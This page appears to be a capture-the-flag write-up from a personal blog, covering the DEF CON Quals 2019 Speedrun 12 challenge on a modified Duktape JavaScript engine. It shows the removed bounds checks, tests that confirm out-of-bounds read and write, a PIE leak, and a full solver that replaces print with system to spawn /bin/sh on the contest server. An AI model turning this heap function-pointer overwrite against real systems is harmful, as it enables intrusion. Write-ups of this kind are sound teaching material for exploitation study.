@@ -1,0 +1,309 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Catousify</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
+  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="http://zeroload.github.io/ctf/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="http://zeroload.github.io/ctf/">Catousify</a>
+            </h1>
+
+      <ul id="social-media">
+        
+        
+          
+        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>No Clever Tagline Needed.</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/about/">
+                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>DEF CON Quals 2019 - Speedrun 12</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2019-05-14T00:53:00Z">May 14, 2019</time>
+        </li>
+        
+        <li>
+            Categories:
+            <em>
+                
+                    
+                    <a href="http://zeroload.github.io/ctf/categories/pwn">pwn</a>
+                
+                    , 
+                    <a href="http://zeroload.github.io/ctf/categories/writeup">writeup</a>
+                
+            </em>
+        </li>
+        
+
+        
+
+        <li>5 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    <h2 id="desc">desc</h2>
+<p><a href="https://gist.github.com/adamdoupe/9fb1fed69421e789a0a623af912e456a">https://gist.github.com/adamdoupe/9fb1fed69421e789a0a623af912e456a</a></p>
+<blockquote>
+<p>Downloads :
+<a href="http://zeroload.github.io/ctf/ctf/assets/defcon/speedrun-012/speedrun-012">speedrun-012</a>
+<a href="http://zeroload.github.io/ctf/ctf/assets/defcon/speedrun-012/solve.js">solve.js</a>
+<a href="http://zeroload.github.io/ctf/ctf/assets/defcon/speedrun-012/solve.py">solve.py</a></p>
+</blockquote>
+<h2 id="intro">intro</h2>
+<p>This article is written by a first timer to experience &ldquo;exploiting&rdquo; <del>real</del> JS engine. :p</p>
+<blockquote>
+<p>Duktape is an embeddable Javascript engine, with a focus on portability and compact footprint.</p>
+</blockquote>
+<p>In short we have a mini JS engine pwn. The <code>main</code> function is realtively easy to read,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+  ctx <span style="color:#f92672">=</span> duk_create_heap(NULL, NULL, NULL, NULL, fatal_error);
+  duk_push_c_function(ctx, native_print, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+  duk_put_global_string(ctx, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">print</span><span style="color:#e6db74">&#34;</span>);
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DEBUG</span><span style="color:#e6db74">&#34;</span>) )
+    alarm(<span style="color:#ae81ff">5</span>);
+  <span style="color:#66d9ef">if</span> ( getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">USE_SYSTEM</span><span style="color:#e6db74">&#34;</span>) )
+  {
+    duk_push_c_function(ctx, native_system, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    duk_put_global_string(ctx, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#34;</span>);
+  }
+  memset(input, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x400</span>);
+  read(<span style="color:#ae81ff">0</span>, input, <span style="color:#ae81ff">0x3FF</span>);
+  duk_eval_raw(ctx, input, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xE08</span>);
+  duk_pop(ctx);
+  duk_destroy_heap(ctx);
+</code></pre></div><p>First, the program create the <code>ctx</code> for duktape, then register <code>print</code> function to ctx &ldquo;stack&rdquo;. <code>print</code> it self doesn't have anything fancy, only calling <code>puts</code> to the concatenated argument passed to it. We also have <code>native_system</code> might be useful for later stage, so take note of it. Near the end, the program tries to read JS from user the eval it.</p>
+<h2 id="finding-bugs">finding bugs</h2>
+<p>From the gists, we could see the author did some change to the builtins, the most interesting ones are these,</p>
+<p>from line 765-776</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#75715e">@@ -2347,10 +2344,7 @@
+</span><span style="color:#75715e"></span> 	switch (magic_ftype) {
+ 	case DUK__FLD_8BIT: {
+ 		duk_uint8_t tmp;
+<span style="color:#f92672">-		if (offset + 1U &gt; check_length) {
+</span><span style="color:#f92672"></span><span style="color:#f92672">-			goto fail_bounds;
+</span><span style="color:#f92672"></span><span style="color:#f92672">-		}
+</span><span style="color:#f92672"></span><span style="color:#f92672">-		tmp = buf[offset];
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+		tmp = buf[offset_signed];
+</span><span style="color:#a6e22e"></span> 		if (magic_signed) {
+ 			duk_push_int(thr, (duk_int_t) ((duk_int8_t) tmp));
+} else {
+</code></pre></div><p>from line 866-883</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#75715e">@@ -2653,16 +2670,13 @@
+</span><span style="color:#75715e"></span> 	}
+ 	case DUK__FLD_32BIT: {
+ 		duk_uint32_t tmp;
+<span style="color:#f92672">-		if (offset + 4U &gt; check_length) {
+</span><span style="color:#f92672"></span><span style="color:#f92672">-			goto fail_bounds;
+</span><span style="color:#f92672"></span><span style="color:#f92672">-		}
+</span><span style="color:#f92672"></span> 		tmp = (duk_uint32_t) duk_to_uint32(thr, 0);
+ 		if (endswap) {
+ 			tmp = DUK_BSWAP32(tmp);
+ 		}
+ 		du.ui[0] = tmp;
+ 		/* sign doesn&#39;t matter when writing */
+<span style="color:#f92672">-		duk_memcpy((void *) (buf + offset), (const void *) du.uc, 4);
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+		duk_memcpy((void *) (buf + offset_signed), (const void *) du.uc, 4);
+</span><span style="color:#a6e22e"></span> 		break;
+ 	}
+case DUK__FLD_FLOAT: {
+</code></pre></div><p>The first one is from <code>duk_bi_buffer.c</code> -&gt; <code>duk_bi_buffer_readfield()</code>, or in JS <code>Buffer.read[bitsize]()</code>. This is on <code>DUK__FLD_8BIT</code>, so we could also assume this is in <code>readUInt8()</code>. The removed lines are checking against <code>offset + BLAH</code>, this could be a bound check for read. Well, you wouldn't want the buffer read past the size or certain check_length. Testing it to confirm our assumption,</p>
+<pre><code>$ cat test.js
+var a = new OOOBufferOOO(64);
+print(a.readUInt8(66));
+$ ./speedrun-012 &lt; test.js
+5
+</code></pre><p>Well, that's clearly an OOB read, usually you would get an <code>undefined</code> as result when trying to read past the size.</p>
+<p>The second one is from <code>duk_bi_buffer.c</code> -&gt; <code>duk_bi_buffer_writefield()</code>. Well, you could guess from the first one, this is an OOB write in <code>writeUInt32LE/BE()</code>. To check it again,</p>
+<pre><code>$ cat test.js
+var a = new OOOBufferOOO(64);
+print(a.readUInt8(66));
+a.writeUInt32LE(99, 66);
+print(a.readUInt8(66));
+$ ./speedrun-012 &lt; test.js
+5
+99
+</code></pre><h2 id="finding-attack-vector">finding attack vector</h2>
+<p>Now, we already have R/W primitive, but how to get the shell? The binary has complete protection (NX bit, FULL RELRO, etc.), but&hellip; do you still remember that we have <code>native_system</code> in the binary, and the fact that <code>print</code> register <code>native_print</code> into the ctx stack? Well, see where this will be going? Try to hack this yourself!</p>
+<blockquote>
+<p>damn. Just give me the PoC now. sheesh.</p>
+</blockquote>
+<blockquote>
+<p>ok :|</p>
+</blockquote>
+<h2 id="attaccc">attaccc</h2>
+<p>Well, the idea is to overwrite the function pointer of <code>native_print</code> that get push-ed into ctx stack, which actually lies in heap section. The first step is to find offset difference between <code>OOOBufferOOO</code> and <code>native_print</code>. A simple nice trick to know where out buffer will lands on memory is to create a unique id. For example,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OOOBufferOOO</span>(<span style="color:#ae81ff">64</span>);
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xEF</span>;
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xBE</span>;
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xAD</span>;
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xDE</span>;
+</code></pre></div><p>I've set a to has 0xdeadbeef, then use search in pwndbg,</p>
+<pre><code>pwndbg&gt; search -t dword 0xdeadbeef
+[heap]          0x5555557cbe80 0xdeadbeef
+pwndbg&gt; search -t qword $rebase(native_print)
+[heap]          0x5555557d5af8 0x55555555e270
+</code></pre><p>To get the offset difference, you'll just need substract it, ofc :p. <code>0x5555557cbe80-0x5555557d5af8</code> -&gt; <code>0x9c78</code>. Since duktape can't handle 64bit values, we could only just use 32 bit vars, but it's enough for this case. Try leaking the lower 4 byte of PIE offset,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c7b</span>);
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>;
+<span style="color:#a6e22e">pie</span><span style="color:#f92672">|=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c7a</span>);
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>;
+<span style="color:#a6e22e">pie</span><span style="color:#f92672">|=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c79</span>);
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>;
+<span style="color:#a6e22e">pie</span><span style="color:#f92672">|=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c78</span>);
+<span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">pie</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">native_print</span>;
+<span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">pie</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)); <span style="color:#75715e">// PIE
+</span></code></pre></div><p>After that we just need to overwrite the function pointer to <code>native_system</code>,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">writeUInt32LE</span>(<span style="color:#a6e22e">pie</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">native_system</span>, <span style="color:#ae81ff">0x9c78</span>)
+</code></pre></div><p>Now, calling <code>print()</code> will be the same as <code>system()</code>,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>) <span style="color:#75715e">// system(&#39;/bin/sh&#39;)
+</span></code></pre></div><h2 id="full-solver-and-flagg">full solver and FLAGG</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// note
+</span><span style="color:#75715e"></span><span style="color:#75715e">// a.readUInt8(pos);
+</span><span style="color:#75715e"></span><span style="color:#75715e">// a.writeUInt32LE(val, pos);
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// kindofzfillbutsuperlame
+</span><span style="color:#75715e"></span><span style="color:#75715e">// function pad(b) {
+</span><span style="color:#75715e"></span><span style="color:#75715e">// 	while (b.length &lt; 2) b = &#39;0&#39; + b;
+</span><span style="color:#75715e"></span><span style="color:#75715e">// 	return b;
+</span><span style="color:#75715e"></span><span style="color:#75715e">// }
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// mini &#34;hexdump&#34;
+</span><span style="color:#75715e"></span><span style="color:#75715e">// for (var i = -0x5F18; i &lt; -0x5F00; i += 16) {
+</span><span style="color:#75715e"></span><span style="color:#75715e">// 	r = &#39;&#39;
+</span><span style="color:#75715e"></span><span style="color:#75715e">// 	for (var j = i; j &lt; i + 16; ++j)
+</span><span style="color:#75715e"></span><span style="color:#75715e">// 		r += pad(a.readUInt8(j).toString(16)) + &#39; &#39;;
+</span><span style="color:#75715e"></span><span style="color:#75715e">// 	print(r);
+</span><span style="color:#75715e"></span><span style="color:#75715e">// }
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OOOBufferOOO</span>(<span style="color:#ae81ff">64</span>);
+<span style="color:#a6e22e">native_system</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xA220</span>;
+<span style="color:#a6e22e">native_print</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xA270</span>;
+
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xEF</span>;
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xBE</span>;
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xAD</span>;
+<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xDE</span>;
+
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c7b</span>);
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>;
+<span style="color:#a6e22e">pie</span><span style="color:#f92672">|=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c7a</span>);
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>;
+<span style="color:#a6e22e">pie</span><span style="color:#f92672">|=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c79</span>);
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>;
+<span style="color:#a6e22e">pie</span><span style="color:#f92672">|=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">readUInt8</span>(<span style="color:#ae81ff">0x9c78</span>);
+<span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">pie</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+
+<span style="color:#a6e22e">pie</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">native_print</span>;
+<span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">pie</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+
+<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">writeUInt32LE</span>(<span style="color:#a6e22e">pie</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">native_system</span>, <span style="color:#ae81ff">0x9c78</span>)
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+</code></pre></div><pre><code>λ › python2 solve.py
+[+] Opening connection to speedrun-012.quals2019.oooverflow.io on port 31337: Done
+[*] Switching to interactive mode
+20eb0270
+20ea6000
+$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+$ cat flag
+OOO{Rule #3: Never `open` the package. Who knows what pwns are lying about?
+</code></pre>
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/fireshell-2019-quotes-list/"><i class="fa fa-chevron-circle-left"></i> FireShell 2019 - quotes_list</a>
+        </li>
+        
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/inferno-ctf-pwn/">Inferno CTF 2019 - pwn Write Up <i class="fa fa-chevron-circle-right"></i> </a>
+        </li>
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright © 2019 - kiror0 |
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="http://zeroload.github.io/ctf/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="http://zeroload.github.io/ctf/js/scripts.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-146594173-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+</body>
+
+</html>
